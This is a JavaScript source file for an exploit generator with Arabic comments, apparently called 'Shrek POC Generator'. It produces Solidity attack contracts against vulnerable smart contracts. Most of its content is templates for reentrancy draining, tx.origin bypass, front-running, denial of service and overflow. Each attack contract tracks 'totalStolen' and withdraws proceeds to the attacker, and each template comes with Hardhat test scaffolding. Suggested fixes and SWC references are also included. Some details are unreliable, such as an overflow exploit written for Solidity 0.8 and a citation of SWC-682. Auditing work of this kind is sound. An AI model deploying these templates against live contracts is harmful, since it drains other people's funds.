// ============================================
// 🧠 Shrek POC Generator v3.0
// توليد Proof of Concept ذكي مع التحقق
// ============================================

class ShrekPOCGenerator {
    constructor() {
        this.version = '3.0.0';
        this.templates = this.loadTemplates();
    }
    
    // تحميل قوالب PoC
    loadTemplates() {
        return {
            reentrancy: {
                name: 'Reentrancy Attack',
                description: 'هجوم إعادة الدخول - استغلال ترتيب العمليات',
                prerequisites: [
                    'العقد يستخدم call.value() أو send()/transfer()',
                    'تحديث الرصيد بعد إرسال الأموال',
                    'لا يوجد ReentrancyGuard'
                ],
                attack: [
                    '1. إيداع مبلغ صغير في العقد الضعيف',
                    '2. استدعاء دالة السحب',
                    '3. في receive() إعادة استدعاء السحب',
                    '4. تكرار حتى استنزاف الرصيد'
                ]
            },
            
            overflow: {
                name: 'Arithmetic Overflow/Underflow',
                description: 'تجاوز السعة في العمليات الحسابية',
                prerequisites: [
                    'Solidity < 0.8.0',
                    'لا يوجد SafeMath',
                    'عمليات حسابية مباشرة'
                ],
                attack: [
                    '1. Underflow: تحويل أكثر من الرصيد',
                    '2. Overflow: إضافة كمية تتجاوز الحد الأقصى',
                    '3. استغلال الأرصدة غير الطبيعية'
                ]
            },
            
            txorigin: {
                name: 'Tx.Origin Authentication Bypass',
                description: 'تجاوز التحقق باستخدام tx.origin',
                prerequisites: [
                    'العقد يستخدم tx.origin للتحقق',
                    'لا يستخدم msg.sender',
                    'دوال حساسة without proper access control'
                ],
                attack: [
                    '1. إنشاء عقد وسيط',
                    '2. خداع الضحية لاستدعاء العقد الوسيط',
                    '3. العقد الوسيط يستدعي الدالة الحساسة',
                    '4. tx.origin = الضحية ✅'
                ]
            },
            
            frontrun: {
                name: 'Front-Running Attack',
                description: 'السبق في mempool',
                prerequisites: [
                    'معاملات مربحة معروفة مسبقاً',
                    'لا يوجد Commit-Reveal',
                    'غاز منخفض'
                ],
                attack: [
                    '1. مراقبة mempool',
                    '2. اكتشاف معاملة مربحة',
                    '3. إرسال معاملة بغاز أعلى',
                    '4. تنفيذ المعاملة أولاً'
                ]
            },
            
            dos: {
                name: 'Denial of Service',
                description: 'منع الخدمة',
                prerequisites: [
                    'حلقات على مصفوفات ديناميكية',
                    'selfdestruct بحساب واحد',
                    'استدعاءات خارجية في حلقات'
                ],
                attack: [
                    '1. إضافة عقد يرفض الاستقبال',
                    '2. ملء مصفوفة بعناوين غير صالحة',
                    '3. كسر منطق التوزيع/السحب'
                ]
            }
        };
    }
    
    // توليد PoC ذكي
    generate(vulnType, targetInfo = {}, options = {}) {
        const template = this.templates[vulnType];
        if (!template) return '// Unsupported vulnerability type';
        
        const timestamp = new Date().toLocaleString('ar-EG');
        const targetAddress = targetInfo.address || '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0';
        const targetName = targetInfo.name || 'VictimContract';
        
        // تحليل العقد لإضافة تفاصيل مخصصة
        const customDetails = options.code ? this.analyzeTargetCode(options.code) : {};
        
        return `// ============================================
// 🔬 Shrek POC Generator v${this.version}
// التاريخ: ${timestamp}
// الثغرة: ${template.name}
// العقد المستهدف: ${targetName} (${targetAddress})
// مستوى الخطورة: ${options.severity || 'CRITICAL'}
// ============================================

pragma solidity ^0.8.0;

/**
 * @title Proof of Concept - ${template.name}
 * @description ${template.description}
 * 
 * 🎯 المتطلبات المسبقة:
${template.prerequisites.map(p => ` *   - ${p}`).join('\n')}
 * 
 * ⚔️ خطوات الهجوم:
${template.attack.map(a => ` *   ${a}`).join('\n')}
 */

// ========== 1. واجهة العقد المستهدف ==========
interface IVictim {
${this.generateInterface(vulnType, customDetails)}
    
    // استعلامات
    function balanceOf(address account) external view returns (uint256);
    function getBalance() external view returns (uint256);
}

// ========== 2. عقد الهجوم الذكي ==========
contract ShrekAttack_${this.getAttackName(vulnType)} {
    // معلومات الهجوم
    IVictim public victim;
    address public attacker;
    uint256 public attackCount;
    uint256 public totalStolen;
    
    // الأحداث للتتبع
    event AttackStarted(uint256 timestamp);
    event AttackRound(uint256 round, uint256 amount);
    event BalanceBefore(string target, uint256 amount);
    event BalanceAfter(string target, uint256 amount);
    event Profit(uint256 amount);
    event MitigationDetected(string mitigation);
    
    constructor(address _victim) {
        victim = IVictim(_victim);
        attacker = msg.sender;
    }
    
    /**
     * @dev تنفيذ إثبات الثغرة
     * @param attackParams معاملات الهجوم المخصصة
     */
    function executePOC(bytes memory attackParams) public payable {
        emit AttackStarted(block.timestamp);
        
        // تسجيل الأرصدة قبل الهجوم
        uint256 attackerBalanceBefore = address(this).balance;
        uint256 victimBalanceBefore = address(victim).balance;
        
        emit BalanceBefore("Attacker", attackerBalanceBefore);
        emit BalanceBefore("Victim", victimBalanceBefore);
        
        // ========== تنفيذ الهجوم الذكي ==========
${this.generateAttackCode(vulnType, customDetails)}
        
        // ========== حساب النتائج ==========
        uint256 attackerBalanceAfter = address(this).balance;
        uint256 victimBalanceAfter = address(victim).balance;
        
        emit BalanceAfter("Attacker", attackerBalanceAfter);
        emit BalanceAfter("Victim", victimBalanceAfter);
        
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        totalStolen += profit;
        
        emit Profit(profit);
        
        // التحقق من نجاح الهجوم
        require(profit > 0, "Attack failed - no profit");
    }
    
    /**
     * @dev استقبال الأموال ومعالج الهجوم المتكرر
     */
    receive() external payable {
${this.generateReceiveHandler(vulnType)}
    }
    
    /**
     * @dev سحب الأرباح
     */
    function withdraw() public {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
    }
    
    /**
     * @dev استعلام عن رصيد العقد
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev استعلام عن إحصائيات الهجوم
     */
    function getStats() public view returns (uint256, uint256) {
        return (attackCount, totalStolen);
    }
    
    /**
     * @dev التحقق من وجود إصلاحات
     */
    function checkMitigations() public view returns (string[] memory) {
        string[] memory detected = new string[](0);
        // سيتم تنفيذ التحقق في العقد الحقيقي
        return detected;
    }
}

// ========== 3. سكريبت الاختبار (Hardhat/Foundry) ==========
/*
// اختبار باستخدام Hardhat
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("${template.name} PoC", function() {
    it("should exploit the vulnerability", async function() {
        // نشر العقد الضعيف
        const Victim = await ethers.getContractFactory("${targetName}");
        const victim = await Victim.deploy();
        await victim.deployed();
        
        // تمويل العقد الضعيف
        await victim.deposit({ value: ethers.utils.parseEther("10") });
        
        // نشر عقد الهجوم
        const Attack = await ethers.getContractFactory("ShrekAttack_${this.getAttackName(vulnType)}");
        const attack = await Attack.deploy(victim.address);
        await attack.deployed();
        
        // تنفيذ الهجوم
        await attack.executePOC("0x", { value: ethers.utils.parseEther("1") });
        
        // التحقق من النتائج
        const attackBalance = await ethers.provider.getBalance(attack.address);
        expect(attackBalance).to.be.gt(ethers.utils.parseEther("1"));
    });
});

// اختبار باستخدام Foundry
// forge test --match-path test/${this.getAttackName(vulnType)}.t.sol -vvv
*/

// ========== 4. شرح تفصيلي للإصلاح ==========
/*
🔧 الإصلاح المقترح:

${this.generateFix(vulnType)}

📚 المراجع:
${this.generateReferences(vulnType)}
*/`;
    }
    
    // توليد واجهة العقد حسب الثغرة
    generateInterface(vulnType, customDetails = {}) {
        const interfaces = {
            reentrancy: `    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);`,
            
            overflow: `    function transfer(address to, uint256 amount) external;
    function mint(uint256 amount) external;
    function totalSupply() external view returns (uint256);`,
            
            txorigin: `    function withdrawAll() external;
    function owner() external view returns (address);`,
            
            frontrun: `    function guess(uint256 number) external payable;
    function setSecret(uint256 _secret) external;
    function prize() external view returns (uint256);`,
            
            dos: `    function airdrop() external;
    function addUser(address user) external;
    function users(uint256) external view returns (address);`
        };
        
        let base = interfaces[vulnType] || `    function vulnerable() external;`;
        
        // إضافة دوال مخصصة من تحليل العقد
        if (customDetails.additionalFunctions) {
            base += '\n' + customDetails.additionalFunctions;
        }
        
        return base;
    }
    
    // توليد كود الهجوم
    generateAttackCode(vulnType, customDetails = {}) {
        const attacks = {
            reentrancy: `        // 1. تهيئة الهجوم
        attackCount = 0;
        
        // 2. إيداع مبلغ صغير
        victim.deposit{value: msg.value}();
        
        // 3. بدء هجوم إعادة الدخول
        victim.withdraw(msg.value);`,
            
            overflow: `        // 1. إثبات Underflow
        try {
            victim.transfer(address(0xdead), 1);
        } catch {}
        
        // 2. إثبات Overflow
        try {
            victim.mint(1);
        } catch {}`,
            
            txorigin: `        // تنفيذ سحب الأموال
        // tx.origin = الضحية (المهاجم الخادع)
        // msg.sender = هذا العقد
        victim.withdrawAll();`,
            
            frontrun: `        // تخمين الرقم الصحيح
        // في الهجوم الحقيقي: مراقبة mempool
        uint256 winningNumber = 123456; // يجب معرفته مسبقاً
        victim.guess{value: 0.01 ether}(winningNumber);`,
            
            dos: `        // 1. إضافة عقد يرفض الاستقبال
        victim.addUser(address(this));
        
        // 2. محاولة توزيع - ستفشل
        try {
            victim.airdrop();
        } catch {
            // الهجوم نجح - تم منع الخدمة
        }`
        };
        
        return attacks[vulnType] || `        // كود الهجوم المخصص`;
    }
    
    // توليد معالج receive
    generateReceiveHandler(vulnType) {
        if (vulnType === 'reentrancy') {
            return `        attackCount++;
        
        // هجوم متكرر - 5 مرات
        if (attackCount < 5) {
            uint256 amount = victim.balances(address(this));
            if (amount > 0) {
                victim.withdraw(amount);
            }
        }`;
        }
        
        if (vulnType === 'dos') {
            return `        revert("AttackDoS: ETH rejection");`;
        }
        
        return `        // لا توجد معالجة خاصة`;
    }
    
    // توليد اسم الهجوم
    getAttackName(vulnType) {
        const names = {
            reentrancy: 'Reentrancy',
            overflow: 'Overflow',
            txorigin: 'TxOrigin',
            frontrun: 'FrontRun',
            dos: 'DoS'
        };
        return names[vulnType] || 'POC';
    }
    
    // توليد الإصلاح
    generateFix(vulnType) {
        const fixes = {
            reentrancy: `// ✅ استخدام نمط Checks-Effects-Interactions
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // 1. التحقق (Checks) ✓
    // 2. تحديث الحالة (Effects) ✓
    balances[msg.sender] -= amount;
    
    // 3. التفاعل (Interactions) ✓
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}

// ✅ أو استخدام ReentrancyGuard من OpenZeppelin
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    function withdraw(uint256 amount) public nonReentrant {
        // الكود الآمن هنا
    }
}`,
            
            overflow: `// ✅ الترقية إلى Solidity 0.8.0 أو أعلى
pragma solidity ^0.8.0; // overflow/underflow محمية تلقائياً

// ✅ أو استخدام SafeMath
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SafeToken {
    using SafeMath for uint256;
    
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}`,
            
            txorigin: `// ✅ استخدام msg.sender بدلاً من tx.origin
contract SafeWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender; // ✅
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner"); // ✅
        _;
    }
    
    function withdrawAll() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}`,
            
            frontrun: `// ✅ استخدام Commit-Reveal Scheme
contract SafeLottery {
    mapping(address => bytes32) public commitments;
    mapping(address => uint256) public secrets;
    
    function commit(bytes32 hash) public {
        commitments[msg.sender] = hash;
    }
    
    function reveal(uint256 number) public {
        require(keccak256(abi.encodePacked(number)) == commitments[msg.sender]);
        secrets[msg.sender] = number;
        // الفوز بعد الكشف
    }
}

// ✅ أو استخدام Chainlink VRF
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";`,
            
            dos: `// ✅ استخدام نمط Pull over Push
contract SafeAirdrop {
    mapping(address => uint256) public pending;
    
    function claim() public {
        uint256 amount = pending[msg.sender];
        require(amount > 0, "Nothing to claim");
        
        pending[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}

// ✅ تحديد حد أقصى للمصفوفات
uint256 constant MAX_USERS = 1000;
address[MAX_USERS] public users;
uint256 public userCount;

function addUser(address user) public {
    require(userCount < MAX_USERS, "Max users reached");
    users[userCount] = user;
    userCount++;
}`
        };
        
        return fixes[vulnType] || '// مراجعة وتطبيق أفضل ممارسات الأمان';
    }
    
    // توليد المراجع
    generateReferences(vulnType) {
        const references = {
            reentrancy: `- SWC-107: Reentrancy (https://swcregistry.io/docs/SWC-107)
- ConsenSys: Ethereum Smart Contract Best Practices
- OpenZeppelin: ReentrancyGuard`,
            
            overflow: `- SWC-101: Integer Overflow and Underflow
- SWC-682: Unchecked Return Values
- OpenZeppelin: SafeMath`,
            
            txorigin: `- SWC-115: Authorization through tx.origin
- SWC-111: Use of Deprecated Functions
- Ethereum: Authentication Best Practices`,
            
            frontrun: `- SWC-114: Transaction Order Dependence
- SWC-120: Weak Sources of Randomness
- Chainlink: VRF Documentation`,
            
            dos: `- SWC-113: DoS with Failed Call
- SWC-128: DoS with Block Gas Limit
- SWC-135: DoS with Unexpected Revert`
        };
        
        return references[vulnType] || '- Smart Contract Security Registry';
    }
    
    // تحليل العقد لإضافة تفاصيل مخصصة
    analyzeTargetCode(code) {
        const details = {
            additionalFunctions: ''
        };
        
        // استخراج دوال إضافية
        const functionMatches = code.match(/function\s+(\w+)\s*\([^)]*\)/g) || [];
        const customFunctions = functionMatches
            .map(f => f.replace('function ', '').replace('(', ''))
            .filter(f => !['deposit', 'withdraw', 'transfer', 'mint', 'airdrop', 'addUser', 'guess', 'setSecret', 'withdrawAll'].includes(f));
        
        if (customFunctions.length > 0) {
            details.additionalFunctions = customFunctions
                .map(f => `    function ${f}() external;`)
                .join('\n');
        }
        
        return details;
    }
    
    // توليد PoC متعدد الخطوات
    generateMultiStepPOC(vulnType, steps = []) {
        if (steps.length === 0) {
            steps = this.templates[vulnType]?.attack || [];
        }
        
        let pocCode = this.generate(vulnType);
        
        // إضافة خطوات مخصصة
        const stepsSection = steps
            .map((step, i) => `        // الخطوة ${i + 1}: ${step}`)
            .join('\n');
        
        pocCode = pocCode.replace(
            '// ========== تنفيذ الهجوم الذكي ==========',
            `// ========== تنفيذ الهجوم الذكي ==========\n${stepsSection}`
        );
        
        return pocCode;
    }
}

// تصدير للاستخدام
window.ShrekPOCGenerator = ShrekPOCGenerator;

// توليد PoC
function generatePOC() {
    const vulnType = document.getElementById('vulnType').value;
    const generator = new ShrekPOCGenerator();
    
    // جمع معلومات إضافية
    const targetInfo = {
        address: document.getElementById('targetAddress')?.value || '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0',
        name: document.getElementById('targetName')?.value || 'VictimContract'
    };
    
    const pocCode = generator.generate(vulnType, targetInfo);
    
    const codeBlock = document.getElementById('pocCode');
    codeBlock.innerHTML = `<pre><code class="solidity">${escapeHtml(pocCode)}</code></pre>`;
    
    // تحديث syntax highlighting
    if (window.hljs) {
        hljs.highlightAll();
    }
}

// نسخ PoC
function copyPOC() {
    const code = document.querySelector('#pocCode code')?.innerText;
    if (code) {
        navigator.clipboard.writeText(code);
        alert('✅ تم نسخ كود PoC بنجاح');
    }
}

// حفظ PoC
function savePOC() {
    const code = document.querySelector('#pocCode code')?.innerText;
    if (code) {
        const blob = new Blob([code], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `ShrekPOC_${new Date().getTime()}.sol`;
        a.click();
        URL.revokeObjectURL(url);
        alert('✅ تم حفظ كود PoC بنجاح');
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
